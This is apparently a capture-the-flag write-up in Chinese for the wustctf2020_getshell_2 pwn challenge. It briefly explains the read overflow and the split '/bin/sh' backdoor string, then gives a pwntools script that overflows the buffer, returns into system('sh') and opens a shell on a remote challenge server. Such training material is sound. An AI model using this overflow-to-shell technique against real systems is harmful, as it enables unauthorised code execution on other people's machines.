checksec检查安全机制

![image-20210410215318676](https://static.hack1s.fun/images/2021/04/10/image-20210410215318676.png)

就是一个特别简单的read

![image-20210410215417809](https://static.hack1s.fun/images/2021/04/10/image-20210410215417809.png)

之后有一个shell后门函数，但是字符串不是`/bin/sh`，被拆开了

直接写payload

本来想写ret2libc的，结果发现ret2libc长度不够，就直接用`system('sh')`这样的方式了

```python
from pwn import *
from LibcSearcher import *

#  io = process('./wustctf2020_getshell_2')                                                                                                                                                                    
io = remote('node3.buuoj.cn',28115)

io.recvuntil(' /_/ /_//_\\_\\ \n')
payload = b'a'*0x18 + b'b'*0x4 + p32(0x8048529) + p32(0x8048670)

io.send(payload)

io.interactive()
```

